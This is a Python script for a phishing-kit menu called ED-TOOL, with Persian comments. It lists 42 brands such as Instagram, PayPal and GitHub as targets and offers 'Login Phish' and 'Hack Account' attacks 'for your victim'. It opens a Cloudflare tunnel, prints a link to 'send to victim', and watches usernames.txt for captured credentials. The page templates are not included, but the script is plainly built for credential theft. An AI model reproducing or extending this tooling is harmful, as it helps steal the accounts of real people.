import os, sys, time

# Colors: R=قرمز، G=سبز، B=آبی کم‌رنگ (Cyan)، W=سفید، C=فیروزه‌ای
R, G, B, W, C = '\033[31m', '\033[32m', '\033[36m', '\033[37m', '\033[36m'

def banner():
    os.system('clear')
    # بنر ED-TOOL طبق عکس 1000050238
    print(f"{R}" + r"""
 ________  ________  ________  ___  ________      
|\   __  \|\   __  \|\   __  \|\  \|\   ____\     
\ \  \|\  \ \  \|\  \ \  \|\  \ \  \ \  \___|_    
 \ \   ____\ \   __  \ \   ____\ \  \ \_____  \   
  \ \  \___|\ \  \ \  \ \  \___|\ \  \|____|\  \  
   \ \__\    \ \__\ \__\ \__\    \ \__\____\_\  \ 
    \|__|     \|__|\|__|\|__|     \|__|\_________\
                                      \|_________|
    """)
    print(f"             {W}[{R}::{W}] {R}ED-TOOL {W}[{R}::{W}]")
    print(f"         {W}Version : {G}2.4 {W}| Created by : {G}EDRIS")
    print(f"{R}---------------------------------------------------")

def main():
    # لیست ۴۲ برنامه با رنگ آبی کم‌رنگ طبق خواسته جدیدت
    apps = [
        "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", 
        "Steam", "Twitter", "Playstation", "Tiktok", "Twitch", "Pinterest", 
        "Snapchat", "Linkedin", "Ebay", "Quora", "Protonmail", "Spotify", 
        "Reddit", "Adobe", "DeviantArt", "Badoo", "Origin", "DropBox", 
        "Yahoo", "Wordpress", "Yandex", "StackOverflow", "Vk", "XBOX", 
        "Mediafire", "Gitlab", "Github", "Discord", "Spotify", "Mega", 
        "Amazon", "Apple", "Messenger", "Telegram", "Snapchat-V2", "Wifi-Hack"
    ]
    
    while True:
        banner()
        print(f" {G}[::] Select An Attack For Your Victim [::]\n")
        
        for i in range(0, 14):
            col1 = f"{R}[{W}{i+1:02}{R}] {B}{apps[i]:<13}"
            col2 = f"{R}[{W}{i+15:02}{R}] {B}{apps[i+14]:<13}"
            if i+29 <= 42:
                col3 = f"{R}[{W}{i+29:02}{R}] {B}{apps[i+28]:<13}"
            else:
                col3 = ""
            print(f"{col1} {col2} {col3}")
        
        print(f"\n{R}[{W}99{R}] {W}About      {R}[{W}00{R}] {W}Exit")
        choice = input(f"\n{R}[-] Select an option : {W}")
        if choice == "00": break
        
        banner()
        target = apps[int(choice)-1]
        print(f" {G}[::] Target: {target} [::]")
        if choice == "02": # Instagram
            print(f" {W}[{R}1{W}] {G}Followers  {W}[{R}2{W}] {G}Blue Badge  {W}[{R}3{W}] {G}Hack Account")
        else:
            print(f" {W}[{R}1{W}] {G}Standard   {W}[{R}2{W}] {G}Login Phish {W}[{R}3{W}] {G}Data Hack")
        input(f"\n {R}[?] {W}Select Attack Type: ")

        banner()
        print(f" {W}[{R}1{W}] Cloudflared {G}(Global HTTPS)")
        print(f" {W}[{R}2{W}] Ngrok {G}(Global Link)")
        print(f" {W}[{R}3{W}] Localhost {G}(Only Local)")
        srv = input(f"\n {G}[::] Select Tunneling Service: {W}")

        port_q = input(f"\n {C}Do you want to use a specific port? (y/n): {W}").lower()
        port = input(f" {G}Enter your Port: {W}") if port_q == 'y' else "8080"

        banner()
        if srv == "1":
            print(f"{R}[*] Starting Cloudflared Global Tunnel...")
            os.system(f"cloudflared tunnel --url http://127.0.0.1:{port} > link.txt 2>&1 &")
            time.sleep(8)
            print(f"\n{G}[+] Send this Global Link to Victim:")
            os.system("grep -o 'https://[-0-9a-z.]*trycloudflare.com' link.txt")
        else:
            print(f"\n{G}[+] Your ED-TOOL Link: {C}http://localhost:{port}")
        
        print(f"\n {R}[!] Waiting for Data on Port {port}...")
        while True:
            if os.path.exists("usernames.txt"):
                print(f"\n{G}[💖] NEW DATA RECEIVED!")
                os.system("cat usernames.txt")
                time.sleep(2)
            time.sleep(3)

if __name__ == "__main__":
    try: main()
    except: sys.exit()
